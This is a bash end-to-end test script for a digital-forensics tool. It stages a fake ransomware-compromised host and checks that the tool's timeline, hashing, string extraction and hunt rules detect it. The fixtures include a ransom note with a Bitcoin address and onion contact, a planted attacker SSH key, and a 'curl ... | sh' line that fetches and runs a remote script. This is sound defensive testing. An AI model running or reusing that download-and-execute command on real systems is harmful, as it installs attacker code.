#!/usr/bin/env bash
# e2e_local.sh - full-lifecycle proof of gravedigger against a staged case.
# Proves: timeline (body/csv/json) -> hash + known-bad match -> strings utf16
#         -> hunt findings + exit codes -> sweep report -> clean tree exits 0.
set -u

REPO="$(cd "$(dirname "$0")/.." && pwd)"
CASE="$(mktemp -d "${TMPDIR:-/tmp}/gravedigger-e2e.XXXXXX")"
trap 'rm -rf "$CASE"' EXIT

command -v cargo >/dev/null 2>&1 || { echo "e2e: cargo not in PATH"; exit 1; }
cd "$REPO" || exit 1

fail=0
say() { echo; echo "=== $* ==="; }

say "0. build (release)"
cargo build --release --quiet || exit 1
BIN="$REPO/target/release/gravedigger"

say "1. stage a fake compromised host"
mkdir -p "$CASE/host/Documents" "$CASE/host/.ssh" "$CASE/host/clean"
printf 'ALL YOUR FILES HAVE BEEN ENCRYPTED\nsend 0.35 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\npayment within 72 hours\ntalk to us: recoverhelp2345door.onion\n' > "$CASE/host/Documents/RESTORE_FILES.txt"
head -c 8192 /dev/urandom > "$CASE/host/Documents/invoice_2026.pdf.8x2q.locked"
printf 'curl http://185.220.101.4/p.sh | sh\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ attacker@dropbox\n' > "$CASE/host/.ssh/authorized_keys"
python3 - "$CASE/host/Documents/_HELP.txt" <<'PYEOF' || fail=1
import sys
data = bytearray(b"\xff\xfe")
for ch in "DECRYPT ALL VOLUMES TONIGHT":
    data += bytes([ord(ch), 0])
open(sys.argv[1], "wb").write(bytes(data))
PYEOF
printf 'date,amount\n2026-10-08,42\n' > "$CASE/host/clean/ledger.csv"
echo "staged: $CASE/host"

say "2. timeline --format body (line shape + counts)"
"$BIN" timeline "$CASE/host" > "$CASE/tl.body" || fail=1
LINES=$(wc -l < "$CASE/tl.body")
[ "$LINES" -ge 8 ] || { echo "e2e: body lines=$LINES too few"; fail=1; }
grep -qE '^[0-9]+\|.*\|[-dlr]/[rwx-]{9}\|[0-9]+\|[0-9]+\|[0-9]+\|-?[0-9]+\|-?[0-9]+\|-?[0-9]+\|-?[0-9]+$' "$CASE/tl.body" \
  || { echo "e2e: body format check failed"; head -3 "$CASE/tl.body"; fail=1; }
echo "body lines: $LINES (format OK)"

say "3. timeline --format csv + json"
"$BIN" timeline "$CASE/host" --format csv > "$CASE/tl.csv" || fail=1
head -1 "$CASE/tl.csv" | grep -q '^md5,name,inode,mode,uid,gid,size,atime,mtime,ctime,crtime$' || { echo "e2e: csv header bad"; fail=1; }
"$BIN" timeline "$CASE/host" --format json --quiet | python3 -m json.tool > /dev/null || { echo "e2e: json invalid"; fail=1; }

say "4. timeline --since future (filter must empty the output)"
"$BIN" timeline "$CASE/host" --since 2090-01-01 --quiet > "$CASE/tl.future"
[ "$(wc -l < "$CASE/tl.future")" -eq 0 ] || { echo "e2e: --since filter leaked entries"; fail=1; }
echo "filter OK"

say "5. hash + known-bad match (must exit 3)"
BADHASH=$(sha256sum "$CASE/host/Documents/invoice_2026.pdf.8x2q.locked" | cut -d' ' -f1)
printf '# staged ioc\n%s\n' "$BADHASH" > "$CASE/bad.hashes"
set +e
"$BIN" hash "$CASE/host" --against "$CASE/bad.hashes" --quiet > "$CASE/hashes.txt"
RC=$?
set -e
[ "$RC" -eq 3 ] || { echo "e2e: hash rc=$RC expected 3"; fail=1; }
grep -q "$BADHASH" "$CASE/hashes.txt" || { echo "e2e: hash output missing known-bad"; fail=1; }
echo "hash match rc=3 OK"

say "6. strings --utf16 finds the windows-style note"
"$BIN" strings "$CASE/host" --utf16 --quiet > "$CASE/strings.txt" || fail=1
grep -qi "DECRYPT ALL VOLUMES" "$CASE/strings.txt" || { echo "e2e: utf16 extraction failed"; fail=1; }
echo "utf16 OK"

say "7. hunt (must exit 3 and hit all the big rules)"
set +e
"$BIN" hunt "$CASE/host" > "$CASE/hunt.txt" 2>"$CASE/hunt.err"
RC=$?
set -e
[ "$RC" -eq 3 ] || { echo "e2e: hunt rc=$RC expected 3"; fail=1; }
for rule in RANSOM-NOTE RANSOM-DOUBLE-EXT RANSOM-TEXT BTC-ADDR SH-CURLPIPE TOR-LINK; do
  grep -q "\[$rule\]" "$CASE/hunt.txt" || { echo "e2e: hunt missing $rule"; fail=1; }
done
cat "$CASE/hunt.err"
echo "hunt findings OK"

say "8. hunt --json is machine-clean"
"$BIN" hunt "$CASE/host" --json --quiet | python3 -m json.tool > /dev/null || { echo "e2e: hunt json invalid"; fail=1; }

say "9. clean tree must exit 0"
set +e
"$BIN" hunt "$CASE/host/clean" --quiet
RC=$?
set -e
[ "$RC" -eq 0 ] || { echo "e2e: clean hunt rc=$RC expected 0"; fail=1; }
echo "clean rc=0 OK"

say "10. sweep --profile minimal (report + manifest + custody hashes)"
"$BIN" sweep --out "$CASE" --profile minimal || fail=1
REPORT=$(ls -d "$CASE"/gravedigger_sweep_* | head -1)
[ -f "$REPORT/manifest.json" ] || { echo "e2e: sweep manifest missing"; fail=1; }
python3 - "$REPORT/manifest.json" <<'PYEOF' || fail=1
import json, sys
m = json.load(open(sys.argv[1]))
assert m["collected"], "no artifacts collected"
hashes = [i["sha256"] for i in m["collected"] if i["sha256"]]
assert hashes, "no custody hashes in manifest"
print(f"manifest OK: {len(m['collected'])} artifacts, {len(hashes)} hashed")
PYEOF

say "RESULT"
if [ "$fail" -eq 0 ]; then
  echo "E2E: ALL PASS"
else
  echo "E2E: FAILURES PRESENT"
fi
exit "$fail"
